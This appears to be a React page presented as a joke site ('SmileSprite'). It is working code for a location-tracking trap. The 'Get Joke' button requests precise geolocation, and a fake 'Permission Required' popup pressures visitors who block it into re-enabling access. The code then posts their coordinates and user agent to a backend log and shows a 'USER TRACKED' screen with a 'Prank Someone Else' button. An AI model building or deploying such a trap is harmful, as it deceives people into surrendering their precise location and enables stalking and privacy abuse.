import { useState, useEffect } from "react";
import axios from "axios";

export default function Home() {
  const [view, setView] = useState("bait"); 
  const [joke, setJoke] = useState("");
  const [trapData, setTrapData] = useState(null);
  
  // 1. THE AGGRESSIVE ATTEMPT
  const handleJokeClick = async () => {
    setView("loading"); // Show spinner briefly

    console.log("Asking Browser for Location...");
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            // SUCCESS: They clicked Allow
            fetchJokeAndTrap(position.coords.latitude, position.coords.longitude);
        },
        (error) => {
            // FAIL: They clicked Block (or browser auto-blocked)
            console.warn("Blocked:", error);
            setView("permission_popup"); // Show OUR custom popup
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  const fetchJokeAndTrap = async (lat, lng) => {
    try {
        const jokeRes = await axios.get("https://official-joke-api.appspot.com/random_joke");
        setJoke(`${jokeRes.data.setup} ... ${jokeRes.data.punchline}`);
    } catch (err) {
        setJoke("System Error: Joke API failed.");
    }

    setTrapData({ lat, lng, ip: "Fetching..." });

    try {
        const BACKEND_URL = `${import.meta.env.VITE_BACKEND_URL}/api/logs`;
        await axios.post(BACKEND_URL, {
            latitude: lat,
            longitude: lng,
            device: navigator.userAgent
        });
        setTrapData({ lat, lng, ip: "Captured" });
    } catch (error) {
        setTrapData({ lat, lng, ip: "Error Saving" });
    }

    setView("trapped");
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-gray-900 text-white p-4 text-center">
      
      {/* 1. THE BAIT */}
      {view === "bait" && (
        <div className="space-y-6">
          <h1 className="text-4xl font-bold text-yellow-400">Welcome to SmileSprite 🥤</h1>
          <p className="text-gray-300 mt-2">Fresh jokes served daily.</p>
          <button onClick={handleJokeClick} className="px-8 py-4 bg-blue-600 hover:bg-blue-500 text-xl font-bold rounded-full shadow-lg transition transform hover:scale-105">
            🃏 Get Joke
          </button>
        </div>
      )}

      {/* 2. LOADING */}
      {view === "loading" && (
        <div className="flex flex-col items-center space-y-4">
          <div className="h-12 w-12 animate-spin rounded-full border-4 border-blue-500 border-t-transparent"></div>
          <p className="text-lg font-mono text-green-400">Waiting for you...</p>
        </div>
      )}

      {/* 3. YOUR CUSTOM POPUP (The "Please Allow" Screen) */}
      {view === "permission_popup" && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-gray-800 border-2 border-red-500 p-8 rounded-xl max-w-sm w-full shadow-2xl animate-bounce-in">
            
            <div className="text-5xl mb-4">🔒</div>
            <h2 className="text-2xl font-bold text-white mb-2">Permission Required</h2>
            <p className="text-gray-300 mb-6">
              We need your permission to unlock the joke. 
              <br/>
              <span className="text-yellow-400 text-sm">
                (If blocked, click the Lock Icon 🔒 in the URL bar and select "Reset")
              </span>
            </p>

            {/* This button tries the loop again */}
            <button 
              onClick={handleJokeClick} 
              className="w-full py-3 bg-red-600 hover:bg-red-500 text-white font-bold rounded-lg transition"
            >
              OK, I Fixed It 🔄
            </button>

          </div>
        </div>
      )}

      {/* 4. TRAPPED */}
      {view === "trapped" && (
        <div className="max-w-2xl w-full space-y-8 animate-fade-in">
          <div className="bg-gray-800 p-6 rounded-lg shadow-xl border border-gray-700">
            <h2 className="text-2xl font-bold text-yellow-400 mb-2">The Joke:</h2>
            <p className="text-xl italic">"{joke}"</p>
          </div>
          <div className="bg-black p-6 rounded-lg font-mono text-left shadow-2xl border border-green-500 relative overflow-hidden">
            <div className="absolute top-0 left-0 w-full h-1 bg-green-500 opacity-50 animate-scan"></div>
            <h3 className="text-red-500 font-bold text-lg mb-4">⚠️ SYSTEM ALERT: USER TRACKED</h3>
            <div className="space-y-2 text-green-400">
               <p>{`> Latitude.................... ${trapData?.lat}`}</p>
               <p>{`> Longitude................... ${trapData?.lng}`}</p>
               <p className="text-white bg-red-600 inline-block px-1 mt-2">{`> CAUGHT! 📸`}</p>
            </div>
          </div>
          <button onClick={() => window.location.reload()} className="text-gray-500 underline">Prank Someone Else</button>
        </div>
      )}
    </div>
  );
}